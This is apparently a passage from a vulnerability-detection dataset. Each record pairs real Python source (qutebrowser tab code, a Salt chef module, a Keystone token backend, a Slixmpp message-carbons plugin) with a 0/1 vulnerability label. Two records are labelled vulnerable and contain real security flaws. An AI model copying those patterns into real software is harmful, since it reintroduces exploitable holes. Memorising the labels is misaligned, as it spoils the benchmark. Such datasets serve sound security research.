self._widget.triggerPageAction(a)\n\n    def move_to_prev_word(self, count=1):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToPreviousWord\n        else:\n            act = QWebPage.SelectPreviousWord\n        for _ in range(count):\n            self._widget.triggerPageAction(act)\n\n    def move_to_start_of_line(self):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToStartOfLine\n        else:\n            act = QWebPage.SelectStartOfLine\n        self._widget.triggerPageAction(act)\n\n    def move_to_end_of_line(self):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToEndOfLine\n        else:\n            act = QWebPage.SelectEndOfLine\n        self._widget.triggerPageAction(act)\n\n    def move_to_start_of_next_block(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToNextLine,\n                   QWebPage.MoveToStartOfBlock]\n        else:\n            act = [QWebPage.SelectNextLine,\n                   QWebPage.SelectStartOfBlock]\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_start_of_prev_block(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToPreviousLine,\n                   QWebPage.MoveToStartOfBlock]\n        else:\n            act = [QWebPage.SelectPreviousLine,\n                   QWebPage.SelectStartOfBlock]\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_end_of_next_block(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToNextLine,\n                   QWebPage.MoveToEndOfBlock]\n        else:\n            act = [QWebPage.SelectNextLine,\n                   QWebPage.SelectEndOfBlock]\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_end_of_prev_block(self, count=1):\n        if not self.selection_enabled:\n            act = [QWebPage.MoveToPreviousLine, QWebPage.MoveToEndOfBlock]\n        else:\n            act = [QWebPage.SelectPreviousLine, QWebPage.SelectEndOfBlock]\n        for _ in range(count):\n            for a in act:\n                self._widget.triggerPageAction(a)\n\n    def move_to_start_of_document(self):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToStartOfDocument\n        else:\n            act = QWebPage.SelectStartOfDocument\n        self._widget.triggerPageAction(act)\n\n    def move_to_end_of_document(self):\n        if not self.selection_enabled:\n            act = QWebPage.MoveToEndOfDocument\n        else:\n            act = QWebPage.SelectEndOfDocument\n        self._widget.triggerPageAction(act)\n\n    def toggle_selection(self):\n        self.selection_enabled = not self.selection_enabled\n        self.selection_toggled.emit(self.selection_enabled)\n\n    def drop_selection(self):\n        self._widget.triggerPageAction(QWebPage.MoveToNextChar)\n\n    def selection(self, callback):\n        callback(self._widget.selectedText())\n\n    def follow_selected(self, *, tab=False):\n        if QWebSettings.globalSettings().testAttribute(\n                QWebSettings.JavascriptEnabled):\n            if tab:\n                self._tab.data.override_target = usertypes.ClickTarget.tab\n            self._tab.run_js_async(\"\"\"\n                const aElm = document.activeElement;\n                if (window.getSelection().anchorNode) {\n                    window.getSelection().anchorNode.parentNode.click();\n                } else if (aElm && aElm !== document.body) {\n                    aElm.click();\n                }\n            \"\"\")\n        else:\n            selection = self._widget.selectedHtml()\n            if not selection:\n                # Getting here may mean we crashed, but we can't do anything\n                # about that until this commit is released:\n                # https://github.com/annulen/webkit/commit/0e75f3272d149bc64899c161f150eb341a2417af\n                # TODO find a way to check if something is focused\n                self._follow_enter(tab)\n                return\n            try:\n                selected_element = xml.etree.ElementTree.fromstring(\n                    '<html>{}</html>'.format(selection)).find('a')\n            except xml.etree.ElementTree.ParseError:\n                raise browsertab.WebTabError('Could not parse selected '\n                                             'element!')\n\n            if selected_element is not None:\n                try:\n                    url = selected_element.attrib['href']\n                except KeyError:\n                    raise browsertab.WebTabError('Anchor element without '\n                                                 'href!')\n                url = self._tab.url().resolved(QUrl(url))\n                if tab:\n                    self._tab.new_tab_requested.emit(url)\n                else:\n                    self._tab.openurl(url)\n\n\nclass WebKitZoom(browsertab.AbstractZoom):\n\n    \"\"\"QtWebKit implementations related to zooming.\"\"\"\n\n    def _set_factor_internal(self, factor):\n        self._widget.setZoomFactor(factor)\n\n\nclass WebKitScroller(browsertab.AbstractScroller):\n\n    \"\"\"QtWebKit implementations related to scrolling.\"\"\"\n\n    # FIXME:qtwebengine When to use the main frame, when the current one?\n\n    def pos_px(self):\n        return self._widget.page().mainFrame().scrollPosition()\n\n    def pos_perc(self):\n        return self._widget.scroll_pos\n\n    def to_point(self, point):\n        self._widget.page().mainFrame().setScrollPosition(point)\n\n    def to_anchor(self, name):\n        self._widget.page().mainFrame().scrollToAnchor(name)\n\n    def delta(self, x=0, y=0):\n        qtutils.check_overflow(x, 'int')\n        qtutils.check_overflow(y, 'int')\n        self._widget.page().mainFrame().scroll(x, y)\n\n    def delta_page(self, x=0.0, y=0.0):\n        if y.is_integer():\n            y = int(y)\n            if y == 0:\n                pass\n            elif y < 0:\n                self.page_up(count=-y)\n            elif y > 0:\n                self.page_down(count=y)\n            y = 0\n        if x == 0 and y == 0:\n            return\n        size = self._widget.page().mainFrame().geometry()\n        self.delta(x * size.width(), y * size.height())\n\n    def to_perc(self, x=None, y=None):\n        if x is None and y == 0:\n            self.top()\n        elif x is None and y == 100:\n            self.bottom()\n        else:\n            for val, orientation in [(x, Qt.Horizontal), (y, Qt.Vertical)]:\n                if val is not None:\n                    frame = self._widget.page().mainFrame()\n                    maximum = frame.scrollBarMaximum(orientation)\n                    if maximum == 0:\n                        continue\n                    pos = int(maximum * val / 100)\n                    pos = qtutils.check_overflow(pos, 'int', fatal=False)\n                    frame.setScrollBarValue(orientation, pos)\n\n    def _key_press(self, key, count=1, getter_name=None, direction=None):\n        frame = self._widget.page().mainFrame()\n        getter = None if getter_name is None else getattr(frame, getter_name)\n\n        # FIXME:qtwebengine needed?\n        # self._widget.setFocus()\n\n        for _ in range(min(count, 5000)):\n            # Abort scrolling if the minimum/maximum was reached.\n            if (getter is not None and\n                    frame.scrollBarValue(direction) == getter(direction)):\n                return\n            self._tab.key_press(key)\n\n    def up(self, count=1):\n        self._key_press(Qt.Key_Up, count, 'scrollBarMinimum', Qt.Vertical)\n\n    def down(self, count=1):\n        self._key_press(Qt.Key_Down, count, 'scrollBarMaximum', Qt.Vertical)\n\n    def left(self, count=1):\n        self._key_press(Qt.Key_Left, count, 'scrollBarMinimum', Qt.Horizontal)\n\n    def right(self, count=1):\n        self._key_press(Qt.Key_Right, count, 'scrollBarMaximum', Qt.Horizontal)\n\n    def top(self):\n        self._key_press(Qt.Key_Home)\n\n    def bottom(self):\n        self._key_press(Qt.Key_End)\n\n    def page_up(self, count=1):\n        self._key_press(Qt.Key_PageUp, count, 'scrollBarMinimum', Qt.Vertical)\n\n    def page_down(self, count=1):\n        self._key_press(Qt.Key_PageDown, count, 'scrollBarMaximum',\n                        Qt.Vertical)\n\n    def at_top(self):\n        return self.pos_px().y() == 0\n\n    def at_bottom(self):\n        frame = self._widget.page().currentFrame()\n        return self.pos_px().y() >= frame.scrollBarMaximum(Qt.Vertical)\n\n\nclass WebKitHistory(browsertab.AbstractHistory):\n\n    \"\"\"QtWebKit implementations related to page history.\"\"\"\n\n    def current_idx(self):\n        return self._history.currentItemIndex()\n\n    def can_go_back(self):\n        return self._history.canGoBack()\n\n    def can_go_forward(self):\n        return self._history.canGoForward()\n\n    def _item_at(self, i):\n        return self._history.itemAt(i)\n\n    def _go_to_item(self, item):\n        self._tab.predicted_navigation.emit(item.url())\n        self._history.goToItem(item)\n\n    def serialize(self):\n        return qtutils.serialize(self._history)\n\n    def deserialize(self, data):\n        return qtutils.deserialize(data, self._history)\n\n    def load_items(self, items):\n        if items:\n            self._tab.predicted_navigation.emit(items[-1].url)\n\n        stream, _data, user_data = tabhistory.serialize(items)\n        qtutils.deserialize_stream(stream, self._history)\n        for i, data in enumerate(user_data):\n            self._history.itemAt(i).setUserData(data)\n        cur_data = self._history.currentItem().userData()\n        if cur_data is not None:\n            if 'zoom' in cur_data:\n                self._tab.zoom.set_factor(cur_data['zoom'])\n            if ('scroll-pos' in cur_data and\n                    self._tab.scroller.pos_px() == QPoint(0, 0)):\n                QTimer.singleShot(0, functools.partial(\n                    self._tab.scroller.to_point, cur_data['scroll-pos']))\n\n\nclass WebKitElements(browsertab.AbstractElements):\n\n    \"\"\"QtWebKit implemementations related to elements on the page.\"\"\"\n\n    def find_css(self, selector, callback, *, only_visible=False):\n        mainframe = self._widget.page().mainFrame()\n        if mainframe is None:\n            raise browsertab.WebTabError(\"No frame focused!\")\n\n        elems = []\n        frames = webkitelem.get_child_frames(mainframe)\n        for f in frames:\n            for elem in f.findAllElements(selector):\n                elems.append(webkitelem.WebKitElement(elem, tab=self._tab))\n\n        if only_visible:\n            # pylint: disable=protected-access\n            elems = [e for e in elems if e._is_visible(mainframe)]\n            # pylint: enable=protected-access\n\n        callback(elems)\n\n    def find_id(self, elem_id, callback):\n        def find_id_cb(elems):\n            \"\"\"Call the real callback with the found elements.\"\"\"\n            if not elems:\n                callback(None)\n            else:\n                callback(elems[0])\n\n        # Escape non-alphanumeric characters in the selector\n        # https://www.w3.org/TR/CSS2/syndata.html#value-def-identifier\n        elem_id = re.sub(r'[^a-zA-Z0-9_-]', r'\\\\\\g<0>', elem_id)\n        self.find_css('#' + elem_id, find_id_cb)\n\n    def find_focused(self, callback):\n        frame = self._widget.page().currentFrame()\n        if frame is None:\n            callback(None)\n            return\n\n        elem = frame.findFirstElement('*:focus')\n        if elem.isNull():\n            callback(None)\n        else:\n            callback(webkitelem.WebKitElement(elem, tab=self._tab))\n\n    def find_at_pos(self, pos, callback):\n        assert pos.x() >= 0\n        assert pos.y() >= 0\n        frame = self._widget.page().frameAt(pos)\n        if frame is None:\n            # This happens when we click inside the webview, but not actually\n            # on the QWebPage - for example when clicking the scrollbar\n            # sometimes.\n            log.webview.debug(\"Hit test at {} but frame is None!\".format(pos))\n            callback(None)\n            return\n\n        # You'd think we have to subtract frame.geometry().topLeft() from the\n        # position, but it seems QWebFrame::hitTestContent wants a position\n        # relative to the QWebView, not to the frame. This makes no sense to\n        # me, but it works this way.\n        hitresult = frame.hitTestContent(pos)\n        if hitresult.isNull():\n            # For some reason, the whole hit result can be null sometimes (e.g.\n            # on doodle menu links).\n            log.webview.debug(\"Hit test result is null!\")\n            callback(None)\n            return\n\n        try:\n            elem = webkitelem.WebKitElement(hitresult.element(), tab=self._tab)\n        except webkitelem.IsNullError:\n            # For some reason, the hit result element can be a null element\n            # sometimes (e.g. when clicking the timetable fields on\n            # http://www.sbb.ch/ ).\n            log.webview.debug(\"Hit test result element is null!\")\n            callback(None)\n            return\n\n        callback(elem)\n\n\nclass WebKitAudio(browsertab.AbstractAudio):\n\n    \"\"\"Dummy handling of audio status for QtWebKit.\"\"\"\n\n    def set_muted(self, muted: bool):\n        raise browsertab.WebTabError('Muting is not supported on QtWebKit!')\n\n    def is_muted(self):\n        return False\n\n    def is_recently_audible(self):\n        return False\n\n\nclass WebKitTab(browsertab.AbstractTab):\n\n    \"\"\"A QtWebKit tab in the browser.\"\"\"\n\n    def __init__(self, *, win_id, mode_manager, private, parent=None):\n        super().__init__(win_id=win_id, mode_manager=mode_manager,\n                         private=private, parent=parent)\n        widget = webview.WebView(win_id=win_id, tab_id=self.tab_id,\n                                 private=private, tab=self)\n        if private:\n            self._make_private(widget)\n        self.history = WebKitHistory(self)\n        self.scroller = WebKitScroller(self, parent=self)\n        self.caret = WebKitCaret(mode_manager=mode_manager,\n                                 tab=self, parent=self)\n        self.zoom = WebKitZoom(tab=self, parent=self)\n        self.search = WebKitSearch(parent=self)\n        self.printing = WebKitPrinting(tab=self)\n        self.elements = WebKitElements(tab=self)\n        self.action = WebKitAction(tab=self)\n        self.audio = WebKitAudio(parent=self)\n        # We're assigning settings in _set_widget\n        self.settings = webkitsettings.WebKitSettings(settings=None)\n        self._set_widget(widget)\n        self._connect_signals()\n        self.backend = usertypes.Backend.QtWebKit\n\n    def _install_event_filter(self):\n        self._widget.installEventFilter(self._mouse_event_filter)\n\n    def _make_private(self, widget):\n        settings = widget.settings()\n        settings.setAttribute(QWebSettings.PrivateBrowsingEnabled, True)\n\n    def openurl(self, url, *, predict=True):\n        self._openurl_prepare(url, predict=predict)\n        self._widget.openurl(url)\n\n    def url(self, requested=False):\n        frame = self._widget.page().mainFrame()\n        if requested:\n            return frame.requestedUrl()\n        else:\n            return frame.url()\n\n    def dump_async(self, callback, *, plain=False):\n        frame = self._widget.page().mainFrame()\n        if plain:\n            callback(frame.toPlainText())\n        else:\n            callback(frame.toHtml())\n\n    def run_js_async(self, code, callback=None, *, world=None):\n        if world is not None and world != usertypes.JsWorld.jseval:\n            log.webview.warning(\"Ignoring world ID {}\".format(world))\n        document_element = self._widget.page().mainFrame().documentElement()\n        result = document_element.evaluateJavaScript(code)\n        if callback is not None:\n            callback(result)\n\n    def icon(self):\n        return self._widget.icon()\n\n    def shutdown(self):\n        self._widget.shutdown()\n\n    def reload(self, *, force=False):\n        if force:\n            action = QWebPage.ReloadAndBypassCache\n        else:\n            action = QWebPage.Reload\n        self._widget.triggerPageAction(action)\n\n    def stop(self):\n        self._widget.stop()\n\n    def title(self):\n        return self._widget.title()\n\n    def clear_ssl_errors(self):\n        self.networkaccessmanager().clear_all_ssl_errors()\n\n    def key_press(self, key, modifier=Qt.NoModifier):\n        press_evt = QKeyEvent(QEvent.KeyPress, key, modifier, 0, 0, 0)\n        release_evt = QKeyEvent(QEvent.KeyRelease, key, modifier,\n                                0, 0, 0)\n        self.send_event(press_evt)\n        self.send_event(release_evt)\n\n    @pyqtSlot()\n    def _on_history_trigger(self):\n        url = self.url()\n        requested_url = self.url(requested=True)\n        self.add_history_item.emit(url, requested_url, self.title())\n\n    def set_html(self, html, base_url=QUrl()):\n        self._widget.setHtml(html, base_url)\n\n    def networkaccessmanager(self):\n        return self._widget.page().networkAccessManager()\n\n    def user_agent(self):\n        page = self._widget.page()\n        return page.userAgentForUrl(self.url())\n\n    @pyqtSlot()\n    def _on_load_started(self):\n        super()._on_load_started()\n        self.networkaccessmanager().netrc_used = False\n        # Make sure the icon is cleared when navigating to a page without one.\n        self.icon_changed.emit(QIcon())\n\n    @pyqtSlot()\n    def _on_frame_load_finished(self):\n        \"\"\"Make sure we emit an appropriate status when loading finished.\n\n        While Qt has a bool \"ok\" attribute for loadFinished, it always is True\n        when using error pages... See\n        https://github.com/qutebrowser/qutebrowser/issues/84\n        \"\"\"\n        self._on_load_finished(not self._widget.page().error_occurred)\n\n    @pyqtSlot()\n    def _on_webkit_icon_changed(self):\n        \"\"\"Emit iconChanged with a QIcon like QWebEngineView does.\"\"\"\n        if sip.isdeleted(self._widget):\n            log.webview.debug(\"Got _on_webkit_icon_changed for deleted view!\")\n            return\n        self.icon_changed.emit(self._widget.icon())\n\n    @pyqtSlot(QWebFrame)\n    def _on_frame_created(self, frame):\n        \"\"\"Connect the contentsSizeChanged signal of each frame.\"\"\"\n        # FIXME:qtwebengine those could theoretically regress:\n        # https://github.com/qutebrowser/qutebrowser/issues/152\n        # https://github.com/qutebrowser/qutebrowser/issues/263\n        frame.contentsSizeChanged.connect(self._on_contents_size_changed)\n\n    @pyqtSlot(QSize)\n    def _on_contents_size_changed(self, size):\n        self.contents_size_changed.emit(QSizeF(size))\n\n    @pyqtSlot(usertypes.NavigationRequest)\n    def _on_navigation_request(self, navigation):\n        super()._on_navigation_request(navigation)\n        if not navigation.accepted:\n            return\n\n        log.webview.debug(\"target {} override {}\".format(\n            self.data.open_target, self.data.override_target))\n\n        if self.data.override_target is not None:\n            target = self.data.override_target\n            self.data.override_target = None\n        else:\n            target = self.data.open_target\n\n        if (navigation.navigation_type == navigation.Type.link_clicked and\n                target != usertypes.ClickTarget.normal):\n            tab = shared.get_tab(self.win_id, target)\n            tab.openurl(navigation.url)\n            self.data.open_target = usertypes.ClickTarget.normal\n            navigation.accepted = False\n\n        if navigation.is_main_frame:\n            self.settings.update_for_url(navigation.url)\n\n    @pyqtSlot('QNetworkReply*')\n    def _on_ssl_errors(self, reply):\n        self._insecure_hosts.add(reply.url().host())\n\n    def _connect_signals(self):\n        view = self._widget\n        page = view.page()\n        frame = page.mainFrame()\n        page.windowCloseRequested.connect(self.window_close_requested)\n        page.linkHovered.connect(self.link_hovered)\n        page.loadProgress.connect(self._on_load_progress)\n        frame.loadStarted.connect(self._on_load_started)\n        view.scroll_pos_changed.connect(self.scroller.perc_changed)\n        view.titleChanged.connect(self.title_changed)\n        view.urlChanged.connect(self._on_url_changed)\n        view.shutting_down.connect(self.shutting_down)\n        page.networkAccessManager().sslErrors.connect(self._on_ssl_errors)\n        frame.loadFinished.connect(self._on_frame_load_finished)\n        view.iconChanged.connect(self._on_webkit_icon_changed)\n        page.frameCreated.connect(self._on_frame_created)\n        frame.contentsSizeChanged.connect(self._on_contents_size_changed)\n        frame.initialLayoutCompleted.connect(self._on_history_trigger)\n        page.navigation_request.connect(self._on_navigation_request)\n\n    def event_target(self):\n        return self._widget\n", "target": 0}
{"idx": 1011, "func": "# -*- coding: utf-8 -*-\n'''\nExecute chef in server or solo mode\n'''\n\n# Import Python libs\nimport logging\nimport os\nimport tempfile\n\n# Import Salt libs\nimport salt.utils\nimport salt.utils.decorators as decorators\n\nlog = logging.getLogger(__name__)\n\n\ndef __virtual__():\n    '''\n    Only load if chef is installed\n    '''\n    if not salt.utils.which('chef-client'):\n        return False\n    return True\n\n\ndef _default_logfile(exe_name):\n    '''\n    Retrieve the logfile name\n    '''\n    if salt.utils.is_windows():\n        logfile_tmp = tempfile.NamedTemporaryFile(dir=os.environ['TMP'],\n                                                  prefix=exe_name,\n                                                  suffix='.log',\n                                                  delete=False)\n        logfile = logfile_tmp.name\n        logfile_tmp.close()\n    else:\n        logfile = salt.utils.path_join(\n            '/var/log',\n            '{0}.log'.format(exe_name)\n        )\n\n    return logfile\n\n\n@decorators.which('chef-client')\ndef client(whyrun=False,\n           localmode=False,\n           logfile=_default_logfile('chef-client'),\n           **kwargs):\n    '''\n    Execute a chef client run and return a dict with the stderr, stdout,\n    return code, and pid.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' chef.client server=https://localhost\n\n    server\n        The chef server URL\n\n    client_key\n        Set the client key file location\n\n    config\n        The configuration file to use\n\n    config-file-jail\n        Directory under which config files are allowed to be loaded\n        (no client.rb or knife.rb outside this path will be loaded).\n\n    environment\n        Set the Chef Environment on the node\n\n    group\n        Group to set privilege to\n\n    json-attributes\n        Load attributes from a JSON file or URL\n\n    localmode\n        Point chef-client at local repository if True\n\n    log_level\n        Set the log level (debug, info, warn, error, fatal)\n\n    logfile\n        Set the log file location\n\n    node-name\n        The node name for this client\n\n    override-runlist\n        Replace current run list with specified items for a single run\n\n    pid\n        Set the PID file location, defaults to /tmp/chef-client.pid\n\n    run-lock-timeout\n        Set maximum duration to wait for another client run to finish,\n        default is indefinitely.\n\n    runlist\n        Permanently replace current run list with specified items\n\n    user\n        User to set privilege to\n\n    validation_key\n        Set the validation key file location, used for registering new clients\n\n    whyrun\n        Enable whyrun mode when set to True\n\n    '''\n    args = ['chef-client',\n            '--no-color',\n            '--once',\n            '--logfile \"{0}\"'.format(logfile),\n            '--format doc']\n\n    if whyrun:\n        args.append('--why-run')\n\n    if localmode:\n        args.append('--local-mode')\n\n    return _exec_cmd(*args, **kwargs)\n\n\n@decorators.which('chef-solo')\ndef solo(whyrun=False,\n         logfile=_default_logfile('chef-solo'),\n         **kwargs):\n    '''\n    Execute a chef solo run and return a dict with the stderr, stdout,\n    return code, and pid.\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' chef.solo override-runlist=test\n\n    config\n        The configuration file to use\n\n    environment\n        Set the Chef Environment on the node\n\n    group\n        Group to set privilege to\n\n    json-attributes\n        Load attributes from a JSON file or URL\n\n    log_level\n        Set the log level (debug, info, warn, error, fatal)\n\n    logfile\n        Set the log file location\n\n    node-name\n        The node name for this client\n\n    override-runlist\n        Replace current run list with specified items for a single run\n\n    recipe-url\n        Pull down a remote gzipped tarball of recipes and untar it to\n        the cookbook cache\n\n    run-lock-timeout\n        Set maximum duration to wait for another client run to finish,\n        default is indefinitely.\n\n    user\n        User to set privilege to\n\n    whyrun\n        Enable whyrun mode when set to True\n    '''\n    args = ['chef-solo',\n            '--no-color',\n            '--logfile \"{0}\"'.format(logfile),\n            '--format doc']\n\n    args = ['chef-solo', '--no-color', '--logfile {0}'.format(logfile)]\n\n    if whyrun:\n        args.append('--why-run')\n\n    return _exec_cmd(*args, **kwargs)\n\n\ndef _exec_cmd(*args, **kwargs):\n\n    # Compile the command arguments\n    cmd_args = ' '.join(args)\n    cmd_kwargs = ''.join([\n         ' --{0} {1}'.format(k, v)\n         for k, v in kwargs.items() if not k.startswith('__')]\n    )\n    cmd_exec = '{0}{1}'.format(cmd_args, cmd_kwargs)\n    log.debug('Chef command: {0}'.format(cmd_exec))\n\n    return __salt__['cmd.run_all'](cmd_exec, python_shell=False)\n", "target": 0}
{"idx": 1012, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2012 OpenStack LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nimport copy\nimport datetime\n\nfrom keystone.common import sql\nfrom keystone import exception\nfrom keystone import token\n\n\nclass TokenModel(sql.ModelBase, sql.DictBase):\n    __tablename__ = 'token'\n    id = sql.Column(sql.String(64), primary_key=True)\n    expires = sql.Column(sql.DateTime(), default=None)\n    extra = sql.Column(sql.JsonBlob())\n\n    @classmethod\n    def from_dict(cls, token_dict):\n        # shove any non-indexed properties into extra\n        extra = copy.deepcopy(token_dict)\n        data = {}\n        for k in ('id', 'expires'):\n            data[k] = extra.pop(k, None)\n        data['extra'] = extra\n        return cls(**data)\n\n    def to_dict(self):\n        out = copy.deepcopy(self.extra)\n        out['id'] = self.id\n        out['expires'] = self.expires\n        return out\n\n\nclass Token(sql.Base, token.Driver):\n    # Public interface\n    def get_token(self, token_id):\n        session = self.get_session()\n        token_ref = session.query(TokenModel).filter_by(id=token_id).first()\n        now = datetime.datetime.utcnow()\n        if token_ref and (not token_ref.expires or now < token_ref.expires):\n            return token_ref.to_dict()\n        else:\n            raise exception.TokenNotFound(token_id=token_id)\n\n    def create_token(self, token_id, data):\n        data_copy = copy.deepcopy(data)\n        if 'expires' not in data_copy:\n            data_copy['expires'] = self._get_default_expire_time()\n\n        token_ref = TokenModel.from_dict(data_copy)\n        token_ref.id = token_id\n\n        session = self.get_session()\n        with session.begin():\n            session.add(token_ref)\n            session.flush()\n        return token_ref.to_dict()\n\n    def delete_token(self, token_id):\n        session = self.get_session()\n        token_ref = session.query(TokenModel)\\\n                                .filter_by(id=token_id)\\\n                                .first()\n        if not token_ref:\n            raise exception.TokenNotFound(token_id=token_id)\n\n        with session.begin():\n            session.delete(token_ref)\n            session.flush()\n", "target": 1}
{"idx": 1013, "func": "# Copyright (c) 2013-2017 by Ron Frederick <ronf@timeheart.net>.\n# All rights reserved.\n#\n# This program and the accompanying materials are made available under\n# the terms of the Eclipse Public License v1.0 which accompanies this\n# distribution and is available at:\n#\n#     http://www.eclipse.org/legal/epl-v10.html\n#\n# Contributors:\n#     Ron Frederick - initial implementation, API, and documentation\n\n\"\"\"AsyncSSH version information\"\"\"\n\n__author__ = 'Ron Frederick'\n\n__author_email__ = 'ronf@timeheart.net'\n\n__url__ = 'http://asyncssh.timeheart.net'\n\n__version__ = '1.12.1'\n", "target": 0}
{"idx": 1014, "func": "\"\"\"\n    Slixmpp: The Slick XMPP Library\n    Copyright (C) 2012 Nathanael C. Fritz, Lance J.T. Stout\n    This file is part of Slixmpp.\n\n    See the file LICENSE for copying permissio\n\"\"\"\n\nimport logging\n\nimport slixmpp\nfrom slixmpp.stanza import Message, Iq\nfrom slixmpp.xmlstream.handler import Callback\nfrom slixmpp.xmlstream.matcher import StanzaPath\nfrom slixmpp.xmlstream import register_stanza_plugin\nfrom slixmpp.plugins import BasePlugin\nfrom slixmpp.plugins.xep_0280 import stanza\n\n\nlog = logging.getLogger(__name__)\n\n\nclass XEP_0280(BasePlugin):\n\n    \"\"\"\n    XEP-0280 Message Carbons\n    \"\"\"\n\n    name = 'xep_0280'\n    description = 'XEP-0280: Message Carbons'\n    dependencies = {'xep_0030', 'xep_0297'}\n    stanza = stanza\n\n    def plugin_init(self):\n        self.xmpp.register_handler(\n            Callback('Carbon Received',\n                     StanzaPath('message/carbon_received'),\n                     self._handle_carbon_received))\n        self.xmpp.register_handler(\n            Callback('Carbon Sent',\n                     StanzaPath('message/carbon_sent'),\n                     self._handle_carbon_sent))\n\n        register_stanza_plugin(Message, stanza.ReceivedCarbon)\n        register_stanza_plugin(Message, stanza.SentCarbon)\n        register_stanza_plugin(Message, stanza.PrivateCarbon)\n        register_stanza_plugin(Iq, stanza.CarbonEnable)\n        register_stanza_plugin(Iq, stanza.CarbonDisable)\n\n        register_stanza_plugin(stanza.ReceivedCarbon,\n                               self.xmpp['xep_0297'].stanza.Forwarded)\n        register_stanza_plugin(stanza.SentCarbon,\n                               self.xmpp['xep_0297'].stanza.Forwarded)\n\n    def plugin_end(self):\n        self.xmpp.remove_handler('Carbon Received')\n        self.xmpp.remove_handler('Carbon Sent')\n        self.xmpp.plugin['xep_0030'].del_feature(feature='urn:xmpp:carbons:2')\n\n    def session_bind(self, jid):\n        self.xmpp.plugin['xep_0030'].add_feature('urn:xmpp:carbons:2')\n\n    def _handle_carbon_received(self, msg):\n        self.xmpp.event('carbon_received', msg)\n\n    def _handle_carbon_sent(self, msg):\n        self.xmpp.event('carbon_sent', msg)\n\n    def enable(self, ifrom=None, timeout=None, callback=None,\n               timeout_callback=None):\n        iq = self.xmpp.Iq()\n        iq['type'] = 'set'\n        iq['from'] = ifrom\n        iq.enable('carbon_enable')\n        return iq.send(timeout_callback=timeout_callback, timeout=timeout,\n                       callback=callback)\n\n    def disable(self, ifrom=None, timeout=None, callback=None,\n                timeout_callback=None):\n        iq = self.xmpp.Iq()\n        iq['type'] = 'set'\n        iq['from'] = ifrom\n        iq.enable('carbon_disable')\n        return iq.send(timeout_callback=timeout_callback, timeout=timeout,\n                       callback=callback)\n", "target": 1}
{"idx": 1015, "func": "# vim: ft=python fileencoding=utf-8 sts=4 sw=4 et:\n\n# Copyright 2016-2019 Florian Bruhin (The Compiler) <mail@qutebrowser.org>\n#\n# This file is part of qutebrowser.\n#\n# qutebrowser is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# qutebrowser is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with qutebrowser.  If not, see <http://www.gnu.org/licenses/>.\n\n\"\"\"Wrapper over a QWebEngineView.\"\"\"\n\nimport math\nimport functools\nimport re\nimport html as html_utils\n\nfrom PyQt5.QtCore import (pyqtSignal, pyqtSlot, Qt, QPoint, QPointF, QUrl,\n                          QTimer, QObject)\nfrom PyQt5.QtNetwork import QAuthenticator\nfrom PyQt5.QtWidgets import QApplication\nfrom PyQt5.QtWebEngineWidgets import QWebEnginePage, QWebEngineScript\n\nfrom qutebrowser.config import configdata, config\nfrom qutebrowser.browser import browsertab, eventfilter, shared, webelem\nfrom qutebrowser.browser.webengine import (webview, webengineelem, tabhistory,\n                                           interceptor, webenginequtescheme,\n                                           cookies, webenginedownloads,\n                                           webenginesettings, certificateerror)\nfrom qutebrowser.misc import miscwidgets, objects\nfrom qutebrowser.utils import (usertypes, qtutils, log, javascript, utils,\n                               message, objreg, jinja, debug)\nfrom qutebrowser.qt import sip\n\n\n_qute_scheme_handler = None\n\n\ndef init():\n    \"\"\"Initialize QtWebEngine-specific modules.\"\"\"\n    # For some reason we need to keep a reference, otherwise the scheme handler\n    # won't work...\n    # https://www.riverbankcomputing.com/pipermail/pyqt/2016-September/038075.html\n    global _qute_scheme_handler\n\n    app = QApplication.instance()\n    log.init.debug(\"Initializing qute://* handler...\")\n    _qute_scheme_handler = webenginequtescheme.QuteSchemeHandler(parent=app)\n    _qute_scheme_handler.install(webenginesettings.default_profile)\n    if webenginesettings.private_profile:\n        _qute_scheme_handler.install(webenginesettings.private_profile)\n\n    log.init.debug(\"Initializing request interceptor...\")\n    req_interceptor = interceptor.RequestInterceptor(parent=app)\n    req_interceptor.install(webenginesettings.default_profile)\n    if webenginesettings.private_profile:\n        req_interceptor.install(webenginesettings.private_profile)\n\n    log.init.debug(\"Initializing QtWebEngine downloads...\")\n    download_manager = webenginedownloads.DownloadManager(parent=app)\n    download_manager.install(webenginesettings.default_profile)\n    if webenginesettings.private_profile:\n        download_manager.install(webenginesettings.private_profile)\n    objreg.register('webengine-download-manager', download_manager)\n\n    log.init.debug(\"Initializing cookie filter...\")\n    cookies.install_filter(webenginesettings.default_profile)\n    if webenginesettings.private_profile:\n        cookies.install_filter(webenginesettings.private_profile)\n\n    # Clear visited links on web history clear\n    hist = objreg.get('web-history')\n    for p in [webenginesettings.default_profile,\n              webenginesettings.private_profile]:\n        if not p:\n            continue\n        hist.history_cleared.connect(p.clearAllVisitedLinks)\n        hist.url_cleared.connect(lambda url, profile=p:\n                                 profile.clearVisitedLinks([url]))\n\n\n# Mapping worlds from usertypes.JsWorld to QWebEngineScript world 